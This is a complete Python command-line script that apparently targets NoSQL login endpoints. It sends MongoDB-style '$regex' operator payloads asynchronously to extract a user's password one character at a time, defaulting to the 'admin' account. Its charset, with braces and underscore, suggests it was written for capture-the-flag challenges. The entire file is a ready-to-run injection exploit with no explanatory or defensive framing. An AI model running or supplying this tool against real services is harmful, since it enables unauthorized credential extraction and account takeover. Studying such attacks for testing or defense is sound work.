import asyncio
import string
import aiohttp
import logging
from argparse import ArgumentParser

#Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

async def create_payload(username, password, letter):
    """Create the regex payload for the current guess."""
    return {"username": {"$eq": username}, "password": {"$regex": f"^{password}{letter}.*"}}

async def try_character(session, url, username, success_text, password, letter):
    """Attempt to match the next character using the given session."""
    payload = await create_payload(username, password, letter)
    try:
        async with session.post(url, json=payload) as response:
            text = await response.text()
            if success_text in text:
                return letter
    except aiohttp.ClientError as e:
        logging.error(f"Error when requesting with {letter}: {e}")
    return None

async def exploit(url, charset, success_text, username):
    password = ""
    done = False

    async with aiohttp.ClientSession() as session:
        while not done:
            done = True
            tasks = [try_character(session, url, username, success_text, password, letter) for letter in charset]
            results = await asyncio.gather(*tasks)

            results = [result for result in results if result is not None]
            if results:
                password += results[0]
                done = False
                print(f'Current password: {password}')

    logging.info("Done. \nRetrieved password: %s", password)

def main():
    parser = ArgumentParser(description="Script for exploiting regex-based login vulnerability in NoSQL backends.")
    parser.add_argument('host', type=str, help='Target host (ex: http://localhost:8000)')
    parser.add_argument('--endpoint', '-e', type=str, help='Endpoint for login')
    parser.add_argument('--charset', '-c', type=str, default=string.ascii_lowercase + string.digits + string.ascii_uppercase + "_}{!.,/", help='Character set to use for password guessing')
    parser.add_argument('--text', '-t', type=str, help='Text to match in a successful login response.')
    parser.add_argument('--username', '-u', type=str, default="admin", help='Username to attempt to login as')

    args = parser.parse_args()
    
    #Check if URL starts with http:// or https://
    if not (args.host.startswith("http://") or args.host.startswith("https://")):
        url = "http://" + args.host + args.endpoint
    else:
        url = args.host + args.endpoint

    asyncio.run(exploit(url, args.charset, args.text, args.username))

if __name__ == "__main__":
    main()
